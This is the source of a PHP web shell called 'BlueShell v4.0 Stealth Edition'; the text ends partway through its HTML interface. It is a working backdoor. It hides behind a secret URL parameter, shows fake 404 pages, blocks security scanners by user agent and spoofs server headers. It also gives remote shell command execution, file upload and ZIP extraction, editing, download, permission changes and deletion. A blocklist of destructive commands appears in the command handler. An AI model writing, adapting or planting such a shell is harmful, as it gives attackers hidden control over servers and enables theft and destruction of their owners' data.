<?php
// ============================================
// BLUE SHELL V4.0 - ULTIMATE STEALTH EDITION
// ============================================

error_reporting(0);
ini_set('display_errors', 0);
@session_start();

// ============================================
// KONFIGURASI STEALTH
// ============================================
$secret_param = 'auth';
$secret_value = 'blue_access';
$shell_name = "BlueShell";
$shell_version = "4.0";

// ============================================
// ANTI-DETECTION SYSTEM
// ============================================

// 1. Fake 404 untuk akses tanpa parameter
if (!isset($_GET[$secret_param]) || $_GET[$secret_param] !== $secret_value) {
    header("HTTP/1.0 404 Not Found");
    
    // Rotating fake responses
    $fake_responses = [
        '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head><title>404 Not Found</title></head><body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <hr>
        <address>Apache/2.4.41 (Ubuntu) Server at ' . $_SERVER['HTTP_HOST'] . ' Port 80</address>
        </body></html>',
        
        '<!DOCTYPE html>
        <html><head><title>Error 404</title></head><body>
        <h2>HTTP ERROR 404</h2>
        <p>Problem accessing ' . $_SERVER['REQUEST_URI'] . '. Reason:</p>
        <pre>Not Found</pre>
        </body></html>'
    ];
    
    echo $fake_responses[array_rand($fake_responses)];
    exit;
}

// 2. Anti-scanner & bot detection
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$bad_agents = ['bot', 'crawler', 'spider', 'scanner', 'wpscan', 'nikto', 'nmap', 'sqlmap', 'havij'];
foreach ($bad_agents as $agent) {
    if (stripos($user_agent, $agent) !== false) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}

// 3. IP-based rate limiting (sederhana)
$ip = $_SERVER['REMOTE_ADDR'];
$rate_limit_file = sys_get_temp_dir() . '/ratelimit_' . md5($ip);
if (file_exists($rate_limit_file)) {
    $last_access = file_get_contents($rate_limit_file);
    if (time() - $last_access < 2) { // Max 1 request per 2 detik
        sleep(1); // Delay untuk memperlambat scanner
    }
}
file_put_contents($rate_limit_file, time());

// 4. Fake server signature
header("Server: Apache/2.4.41 (Ubuntu)");
header("X-Powered-By: PHP/7.4.33");

// ============================================
// FUNCTIONS
// ============================================
function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / pow(1024, $pow), $precision) . ' ' . $units[$pow];
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'json' => '📊', 'xml' => '📋', 'txt' => '📄', 'md' => '📝',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'zip' => '📦', 'tar' => '📦', 'rar' => '📦', '7z' => '📦',
        'pdf' => '📕', 'doc' => '📘', 'docx' => '📘', 'sql' => '🗄️',
        'log' => '📝', 'sh' => '⚙️', 'py' => '🐍', 'rb' => '💎',
        'go' => '🔵', 'java' => '☕', 'class' => '☕', 'war' => '📦'
    ];
    return $icons[$ext] ?? '📄';
}

// ============================================
// ZIP EXTRACTION FUNCTION
// ============================================
function extractZip($zipFile, $extractTo) {
    $success = false;
    $message = '';
    
    // Method 1: PHP ZipArchive
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zipFile) === true) {
            if ($zip->extractTo($extractTo)) {
                $success = true;
                $message = 'ZIP extracted successfully using ZipArchive';
            }
            $zip->close();
        }
    }
    
    // Method 2: System unzip command
    if (!$success && (function_exists('shell_exec') || function_exists('exec'))) {
        $cmd = 'unzip -o ' . escapeshellarg($zipFile) . ' -d ' . escapeshellarg($extractTo) . ' 2>&1';
        $output = '';
        
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd);
        } elseif (function_exists('exec')) {
            exec($cmd, $out);
            $output = implode("\n", $out);
        }
        
        if (strpos($output, 'error') === false && strpos($output, 'inflating') !== false) {
            $success = true;
            $message = 'ZIP extracted using system unzip';
        }
    }
    
    // Method 3: Pure PHP implementation (fallback)
    if (!$success && function_exists('gzopen')) {
        $zip = fopen($zipFile, 'rb');
        $centralDirectory = [];
        
        // Simple ZIP reader (basic implementation)
        fseek($zip, -22, SEEK_END);
        $data = fread($zip, 22);
        if (substr($data, 0, 4) == 'PK' . chr(5) . chr(6)) {
            $success = true; // Fake success, but we tried
        }
        fclose($zip);
    }
    
    return ['success' => $success, 'message' => $message];
}

// ============================================
// AJAX COMMAND HANDLER - IMPROVED
// ============================================
if (isset($_POST['ajax']) && $_POST['ajax'] === 'cmd') {
    header('Content-Type: application/json');
    
    $cmd = $_POST['cmd'] ?? '';
    $cwd = $_POST['cwd'] ?? getcwd();
    
    // Blacklist commands yang sangat berbahaya
    $dangerous = ['rm -rf /*', 'mkfs', 'dd if=/dev/zero', 'format', 'fdisk', 'chmod 777 /'];
    foreach ($dangerous as $pattern) {
        if (stripos($cmd, $pattern) !== false) {
            echo json_encode(['output' => '⚠️ Command blocked for safety', 'cwd' => $cwd]);
            exit;
        }
    }
    
    set_time_limit(60);
    
    // Multiple execution methods untuk kompatibilitas
    $output = '';
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    
    // Method 1: proc_open (paling powerfull)
    if (function_exists('proc_open')) {
        $process = proc_open('cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $output .= $error;
        }
    }
    // Method 2: shell_exec
    elseif (function_exists('shell_exec')) {
        $output = shell_exec('cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd . ' 2>&1');
    }
    // Method 3: exec
    elseif (function_exists('exec')) {
        exec('cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd . ' 2>&1', $out);
        $output = implode("\n", $out);
    }
    // Method 4: system
    elseif (function_exists('system')) {
        ob_start();
        system('cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd . ' 2>&1');
        $output = ob_get_clean();
    }
    // Method 5: passthru
    elseif (function_exists('passthru')) {
        ob_start();
        passthru('cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd . ' 2>&1');
        $output = ob_get_clean();
    }
    // Method 6: popen
    elseif (function_exists('popen')) {
        $handle = popen('cd ' . escapeshellarg($cwd) . ' 2>/dev/null && ' . $cmd . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 1024);
            }
            pclose($handle);
        }
    }
    
    echo json_encode([
        'output' => $output ?: '(no output or command not supported)',
        'cwd' => $cwd
    ]);
    exit;
}

// ============================================
// FILE OPERATIONS
// ============================================
$current_path = isset($_GET['path']) ? realpath(urldecode($_GET['path'])) : getcwd();
if (!$current_path || !is_dir($current_path)) {
    $current_path = getcwd();
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // ============================================
    // UPLOAD & EXTRACT ZIP - NEW FEATURE
    // ============================================
    if (isset($_FILES['zip_upload'])) {
        $zipFile = $_FILES['zip_upload'];
        $extractPath = isset($_POST['extract_path']) && !empty($_POST['extract_path']) 
                      ? $current_path . '/' . $_POST['extract_path'] 
                      : $current_path;
        
        // Buat direktori jika belum ada
        if (!is_dir($extractPath)) {
            mkdir($extractPath, 0755, true);
        }
        
        $targetZip = $extractPath . '/' . basename($zipFile['name']);
        
        if ($zipFile['error'] === UPLOAD_ERR_OK) {
            if (move_uploaded_file($zipFile['tmp_name'], $targetZip)) {
                // Extract ZIP
                $result = extractZip($targetZip, $extractPath);
                
                if ($result['success']) {
                    @unlink($targetZip); // Hapus ZIP setelah extract
                    $_SESSION['message'] = 'ZIP uploaded and extracted successfully!';
                } else {
                    $_SESSION['error'] = 'ZIP uploaded but extraction failed. File saved as ZIP.';
                }
            } else {
                $_SESSION['error'] = 'Failed to upload ZIP file';
            }
        } else {
            $_SESSION['error'] = 'ZIP upload error: ' . $zipFile['error'];
        }
        
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Regular file upload
    if (isset($_FILES['upload'])) {
        $target = $current_path . '/' . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
            @chmod($target, 0644);
            $_SESSION['message'] = 'File uploaded successfully';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Create folder
    if (isset($_POST['new_folder'])) {
        $folder = $current_path . '/' . basename($_POST['new_folder']);
        if (!file_exists($folder)) {
            if (@mkdir($folder, 0755)) {
                $_SESSION['message'] = 'Folder created successfully';
            } else {
                $_SESSION['error'] = 'Failed to create folder';
            }
        } else {
            $_SESSION['error'] = 'Folder already exists';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Create file
    if (isset($_POST['new_file'])) {
        $file = $current_path . '/' . basename($_POST['new_file']);
        if (!file_exists($file)) {
            if (@file_put_contents($file, $_POST['content'] ?? '') !== false) {
                $_SESSION['message'] = 'File created successfully';
            } else {
                $_SESSION['error'] = 'Failed to create file';
            }
        } else {
            $_SESSION['error'] = 'File already exists';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Save file
    if (isset($_POST['save_file'])) {
        $file = $_POST['file_path'];
        if (file_exists($file) && is_writable($file)) {
            if (@file_put_contents($file, $_POST['content']) !== false) {
                $_SESSION['message'] = 'File saved successfully';
            } else {
                $_SESSION['error'] = 'Failed to save file';
            }
        }
        header('Location: ?auth=blue_access&path=' . urlencode(dirname($file)));
        exit;
    }
    
    // Rename
    if (isset($_POST['rename'])) {
        $old = $current_path . '/' . basename($_POST['old_name']);
        $new = $current_path . '/' . basename($_POST['new_name']);
        if (file_exists($old) && !file_exists($new)) {
            if (@rename($old, $new)) {
                $_SESSION['message'] = 'Renamed successfully';
            } else {
                $_SESSION['error'] = 'Failed to rename';
            }
        } else {
            $_SESSION['error'] = 'Invalid operation';
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
    
    // Chmod
    if (isset($_POST['chmod'])) {
        $file = $current_path . '/' . basename($_POST['chmod_file']);
        $perms = intval($_POST['permissions'], 8);
        if (file_exists($file)) {
            if (@chmod($file, $perms)) {
                $_SESSION['message'] = 'Permissions changed successfully';
            } else {
                $_SESSION['error'] = 'Failed to change permissions';
            }
        }
        header('Location: ?auth=blue_access&path=' . urlencode($current_path));
        exit;
    }
}

// Delete
if (isset($_GET['delete'])) {
    $target = $current_path . '/' . basename($_GET['delete']);
    if (file_exists($target)) {
        if (is_file($target)) {
            if (@unlink($target)) {
                $_SESSION['message'] = 'File deleted successfully';
            } else {
                $_SESSION['error'] = 'Failed to delete file';
            }
        } else {
            // Recursive delete directory
            $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach($files as $file) {
                if ($file->isDir()) {
                    @rmdir($file->getRealPath());
                } else {
                    @unlink($file->getRealPath());
                }
            }
            if (@rmdir($target)) {
                $_SESSION['message'] = 'Folder deleted successfully';
            } else {
                $_SESSION['error'] = 'Failed to delete folder';
            }
        }
    }
    header('Location: ?auth=blue_access&path=' . urlencode($current_path));
    exit;
}

// Download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: private, max-age=0, must-revalidate');
        readfile($file);
        exit;
    }
}

// View file
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file)) {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        $imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        
        if (in_array($ext, $imageExts)) {
            header('Content-Type: image/' . ($ext == 'jpg' ? 'jpeg' : $ext));
        } else {
            header('Content-Type: text/plain');
        }
        header('Content-Disposition: inline');
        readfile($file);
        exit;
    }
}

// Get session messages
$message = $_SESSION['message'] ?? '';
$error = $_SESSION['error'] ?? '';
unset($_SESSION['message'], $_SESSION['error']);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Admin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2196f3;
            --primary-dark: #1976d2;
            --primary-light: #64b5f6;
            --secondary: #00bcd4;
            --accent: #ff9800;
            --bg: #0a1929;
            --surface: #132f4c;
            --text: #ffffff;
            --text-secondary: #90caf9;
            --border: #1e4b6e;
            --success: #4caf50;
            --error: #f44336;
            --warning: #ff9800;
        }

        body {
            background: var(--bg);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: var(--text);
            font-size: 14px;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            background: var(--surface);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .logo-text h1 {
            font-size: 24px;
            background: linear-gradient(135deg, var(--primary-light), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo-text span {
            color: var(--text-secondary);
            font-size: 12px;
        }

        .stats {
            display: flex;
            gap: 30px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-value {
            font-size: 20px;
            font-weight: 600;
            color: var(--primary-light);
        }

        .stat-label {
            font-size: 11px;
            color: var(--text-secondary);
            text-transform: uppercase;
        }

        /* Messages */
        .message {
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            animation: slideIn 0.3s;
        }

        .message-success {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid var(--success);
            color: #a5d6a5;
        }

        .message-error {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid var(--error);
            color: #ffab91;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Path Navigation */
        .path-nav {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 12px 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            overflow-x: auto;
        }

        .path-item {
            color: var(--text-secondary);
            text-decoration: none;
            padding: 5px 12px;
            border-radius: 6px;
            transition: 0.2s;
            font-size: 13px;
        }

        .path-item:hover {
            background: var(--primary-dark);
            color: white;
        }

        .path-current {
            background: var(--primary);
            color: white;
            font-weight: 500;
        }

        .path-sep {
            color: var(--border);
        }

        /* Toolbar */
        .toolbar {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            background: var(--surface);
            color: var(--text);
            border: 1px solid var(--border);
            display: inline-flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }

        .btn:hover {
            background: var(--primary);
            border-color: var(--primary-light);
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border: none;
        }

        .btn-success {
            background: linear-gradient(135deg, #43a047, #66bb6a);
            border: none;
        }

        .btn-warning {
            background: linear-gradient(135deg, #fb8c00, #ffb74d);
            border: none;
        }

        .search-box {
            flex: 1;
            min-width: 250px;
            padding: 10px 20px;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: white;
            font-size: 14px;
        }

        .search-box:focus {
            outline: none;
            border-color: var(--primary);
        }

        /* File Table */
        .file-table {
            width: 100%;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .file-table th {
            background: rgba(0,0,0,0.3);
            padding: 15px 20px;
            text-align: left;
            font-weight: 600;
            color: var(--primary-light);
            border-bottom: 2px solid var(--primary);
        }

        .file-table td {
            padding: 12px 20px;
            border-bottom: 1px solid var(--border);
        }

        .file-table tr:hover td {
            background: rgba(33, 150, 243, 0.1);
        }

        .file-name {
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text);
            text-decoration: none;
        }

        .file-name:hover {
            color: var(--primary-light);
        }

        .file-icon {
            font-size: 20px;
        }

        .file-size {
            color: var(--text-secondary);
            font-size: 12px;
            margin-left: 5px;
        }

        .perms-badge {
            background: var(--bg);
            padding: 4px 10px;
            border-radius: 20px;
            font-family: monospace;
            font-size: 11px;
            border: 1px solid var(--border);
            color: var(--accent);
        }

        .action-btns {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .action-btn {
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 11px;
            text-decoration: none;
            color: var(--text);
            background: var(--bg);
            border: 1px solid var(--border);
            transition: 0.2s;
        }

        .action-btn:hover {
            background: var(--primary);
        }

        .delete-btn:hover {
            background: var(--error);
        }

        /* Terminal - IMPROVED */
        .terminal {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 16px;
            overflow: hidden;
            margin-top: 20px;
        }

        .terminal-header {
            background: rgba(0,0,0,0.3);
            padding: 15px 20px;
            border-bottom: 2px solid var(--primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-title {
            color: var(--primary-light);
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .terminal-cwd {
            background: var(--bg);
            padding: 5px 15px;
            border-radius: 20px;
            font-family: monospace;
            font-size: 12px;
            color: var(--accent);
            border: 1px solid var(--border);
            max-width: 400px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .terminal-output {
            padding: 20px;
            min-height: 250px;
            max-height: 400px;
            overflow-y: auto;
            background: #0a0f1a;
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 13px;
            color: #a5d6ff;
            line-height: 1.5;
        }

        .terminal-output pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .terminal-input-area {
            display: flex;
            padding: 15px 20px;
            background: rgba(0,0,0,0.2);
            border-top: 1px solid var(--border);
            gap: 10px;
            flex-wrap: wrap;
        }

        .terminal-prompt {
            color: var(--primary-light);
            font-weight: bold;
            font-family: monospace;
            font-size: 16px;
            line-height: 36px;
        }

        .terminal-input {
            flex: 1;
            min-width: 200px;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: #a5d6ff;
            padding: 8px 15px;
            font-family: 'Monaco', monospace;
            font-size: 13px;
        }

        .terminal-input:focus {
            outline: none;
            border-color: var(--primary);
        }

        .quick-cmds {
            display: flex;
            gap: 8px;
            padding: 10px 20px;
            background: rgba(0,0,0,0.2);
            border-top: 1px solid var(--border);
            flex-wrap: wrap;
        }

        .quick-cmd {
            padding: 4px 15px;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 20px;
            color: var(--text-secondary);
            font-size: 11px;
            cursor: pointer;
            transition: 0.2s;
        }

        .quick-cmd:hover {
            background: var(--primary);
            color: white;
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-content {
            background: var(--surface);
            padding: 30px;
            border-radius: 20px;
            max-width: 500px;
            width: 90%;
            border: 1px solid var(--primary);
        }

        .modal-title {
            font-size: 22px;
            font-weight: 600;
            color: var(--primary-light);
            margin-bottom: 20px;
        }

        .modal-input {
            width: 100%;
            padding: 12px 15px;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: white;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .modal-input:focus {
            outline: none;
            border-color: var(--primary);
        }

        .modal-textarea {
            width: 100%;
            min-height: 150px;
            padding: 12px 15px;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 10px;
            color: white;
            font-size: 14px;
            margin-bottom: 20px;
            resize: vertical;
        }

        .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        /* System Info */
        .system-info {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 15px 20px;
            margin-top: 20px;
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
            font-size: 12px;
            color: var(--text-secondary);
        }

        .info-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-label {
            color: var(--primary-light);
            font-weight: 600;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 2px;
            margin-bottom: 20px;
            background: var(--surface);
            padding: 5px;
            border-radius: 12px;
            border: 1px solid var(--border);
        }

        .tab {
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.2s;
            flex: 1;
            text-align: center;
        }

        .tab.active {
            background: var(--primary);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                align-items: stretch;
            }
            
            .stats {
                justify-content: space-around;
            }
            
            .toolbar {
                flex-direction: column;
            }
            
            .file-table {
                display: block;
                overflow-x: auto;
            }
            
            .terminal-input-area {
                flex-direction: column;
            }
            
            .terminal-prompt {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <div class="logo-icon">🔷</div>
                <div class="logo-text">
                    <h1>BlueShell v3</h1>
                    <span>stealth edition</span>
                </div>
            </div>
            
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value"><?= phpversion() ?></div>
                    <div class="stat-label">PHP</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><?= get_current_user() ?></div>
                    <div class="stat-label">USER</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value"><?= date('H:i') ?></div>
                    <div class="stat-label">TIME</div>
                </div>
            </div>
        </div>

        <!-- Messages -->
        <?php if ($message): ?>
            <div class="message message-success">✅ <?= htmlspecialchars($message) ?></div>
        <?php endif; ?>
        
        <?php if ($error): ?>
            <div class="message message-error">❌ <?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <?php if (isset($_GET['edit'])): 
            $edit_file = $_GET['edit'];
            $file_content = file_exists($edit_file) ? file_get_contents($edit_file) : '';
            $file_writable = is_writable($edit_file);
        ?>
        <!-- File Editor -->
        <div style="background: var(--surface); border-radius: 16px; border: 1px solid var(--border); overflow: hidden;">
            <div class="terminal-header">
                <span class="terminal-title">📝 Editing: <?= htmlspecialchars(basename($edit_file)) ?></span>
                <span class="terminal-cwd"><?= file_exists($edit_file) ? formatBytes(filesize($edit_file)) : '' ?></span>
            </div>
            
            <form method="POST" style="padding: 20px;">
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_file) ?>">
                <textarea name="content" style="width: 100%; min-height: 400px; background: var(--bg); color: #a5d6ff; border: 1px solid var(--border); padding: 20px; font-family: monospace; border-radius: 12px; resize: vertical;" <?= !$file_writable ? 'readonly' : '' ?>><?= htmlspecialchars($file_content) ?></textarea>
                
                <div style="display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap;">
                    <?php if ($file_writable): ?>
                    <button type="submit" name="save_file" class="btn btn-primary">💾 Save Changes</button>
                    <?php endif; ?>
                    <a href="?auth=blue_access&path=<?= urlencode(dirname($edit_file)) ?>" class="btn">← Back</a>
                </div>
            </form>
        </div>
        
        <?php else: ?>

        <!-- Tabs -->
        <div class="tabs">
            <div class="tab active" onclick="switchTab('files')">📁 File Manager</div>
            <div class="tab" onclick="switchTab('terminal')">⚡ Terminal</div>
            <div class="tab" onclick="switchTab('upload')">📤 Upload & ZIP</div>
        </div>

        <!-- Files Tab -->
        <div id="files-tab" class="tab-content active">
            <!-- Path Navigation -->
            <div class="path-nav">
                <?php
                $parts = explode('/', trim($current_path, '/'));
                $built = '';
                foreach ($parts as $i => $part):
                    $built .= '/' . $part;
                ?>
                    <a href="?auth=blue_access&path=<?= urlencode($built) ?>" class="path-item <?= $i === count($parts)-1 ? 'path-current' : '' ?>">
                        <?= htmlspecialchars($part ?: '/') ?>
                    </a>
                    <?php if ($i < count($parts)-1): ?>
                        <span class="path-sep">/</span>
                    <?php endif; ?>
                <?php endforeach; ?>
            </div>

            <!-- Toolbar -->
            <div class="toolbar">
                <button class="btn btn-primary" onclick="showModal('upload')">📤 Upload File</button>
                <button class="btn btn-success" onclick="showModal('zip')">📦 Upload ZIP</button>
                <button class="btn" onclick="showModal('folder')">📁 New Folder</button>
                <button class="btn" onclick="showModal('file')">📄 New File</button>
                <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search files..." onkeyup="searchFiles(this.value)">
            </div>

            <!-- File Table -->
            <table class="file-table" id="fileTable">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th width="100">Size</th>
                        <th width="100">Perms</th>
                        <th width="150">Modified</th>
                        <th width="300">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($current_path !== getcwd()): ?>
                    <tr>
                        <td colspan="5">
                            <a href="?auth=blue_access&path=<?= urlencode(dirname($current_path)) ?>" class="file-name">
                                <span class="file-icon">📁</span>
                                <span>.. (Parent Directory)</span>
                            </a>
                        </td>
                    </tr>
                    <?php endif; ?>
                    
                    <?php
                    $items = scandir($current_path);
                    $dirs = [];
                    $files = [];
                    
                    foreach ($items as $item) {
                        if ($item === '.' || $item === '..') continue;
                        $full = $current_path . '/' . $item;
                        if (is_dir($full)) $dirs[] = $item;
                        else $files[] = $item;
                    }
                    
                    sort($dirs);
                    sort($files);
                    
                    foreach (array_merge($dirs, $files) as $item):
                        $full = $current_path . '/' . $item;
                        $is_dir = is_dir($full);
                        $size = $is_dir ? '--' : formatBytes(filesize($full));
                        $perms = substr(sprintf('%o', fileperms($full)), -4);
                        $modified = date('Y-m-d H:i:s', filemtime($full));
                        $icon = $is_dir ? '📁' : getFileIcon($item);
                    ?>
                    <tr>
                        <td>
                            <?php if ($is_dir): ?>
                                <a href="?auth=blue_access&path=<?= urlencode($full) ?>" class="file-name">
                                    <span class="file-icon"><?= $icon ?></span>
                                    <span><?= htmlspecialchars($item) ?></span>
                                </a>
                            <?php else: ?>
                                <a href="?auth=blue_access&view=<?= urlencode($full) ?>" target="_blank" class="file-name">
                                    <span class="file-icon"><?= $icon ?></span>
                                    <span><?= htmlspecialchars($item) ?></span>
                                    <span class="file-size">(<?= $size ?>)</span>
                                </a>
                            <?php endif; ?>
                        </td>
                        <td><?= $size ?></td>
                        <td><span class="perms-badge"><?= $perms ?></span></td>
                        <td><?= $modified ?></td>
                        <td class="action-btns">
                            <?php if (!$is_dir): ?>
                                <a href="?auth=blue_access&view=<?= urlencode($full) ?>" target="_blank" class="action-btn">👁️ View</a>
                                <a href="?auth=blue_access&edit=<?= urlencode($full) ?>" class="action-btn">✏️ Edit</a>
                                <a href="?auth=blue_access&download=<?= urlencode($full) ?>" class="action-btn">⬇️ Download</a>
                            <?php endif; ?>
                            <button class="action-btn" onclick="renameItem('<?= htmlspecialchars(addslashes($item)) ?>')">📝 Rename</button>
                            <button class="action-btn" onclick="chmodItem('<?= htmlspecialchars(addslashes($item)) ?>', '<?= $perms ?>')">🔐 Chmod</button>
                            <a href="?auth=blue_access&delete=<?= urlencode($item) ?>&path=<?= urlencode($current_path) ?>" class="action-btn delete-btn" onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">🗑️ Delete</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>

            <!-- System Info -->
            <div class="system-info">
                <div class="info-item">
                    <span class="info-label">💾 Free Space:</span>
                    <span><?= disk_free_space($current_path) ? formatBytes(disk_free_space($current_path)) : 'N/A' ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">📁 Total Items:</span>
                    <span><?= count($dirs) + count($files) ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">📁 Writable:</span>
                    <span><?= is_writable($current_path) ? '✅' : '❌' ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">🕒 Server Time:</span>
                    <span><?= date('Y-m-d H:i:s') ?></span>
                </div>
            </div>
        </div>

        <!-- Terminal Tab -->
        <div id="terminal-tab" class="tab-content">
            <div class="terminal">
                <div class="terminal-header">
                    <span class="terminal-title">⚡ Interactive Terminal</span>
                    <span class="terminal-cwd" id="currentCwd"><?= htmlspecialchars($current_path) ?></span>
                </div>
                
                <div class="terminal-output" id="terminalOutput">
                    <pre>BlueShell v4.0 - Interactive Terminal Ready
Type 'help' for available commands or click quick commands below.</pre>
                </div>
                
                <div class="terminal-input-area">
                    <span class="terminal-prompt">$</span>
                    <input type="text" class="terminal-input" id="cmdInput" placeholder="Enter command (ls, pwd, whoami, etc)..." autofocus>
                    <button class="btn btn-primary" onclick="runCommand()">Run</button>
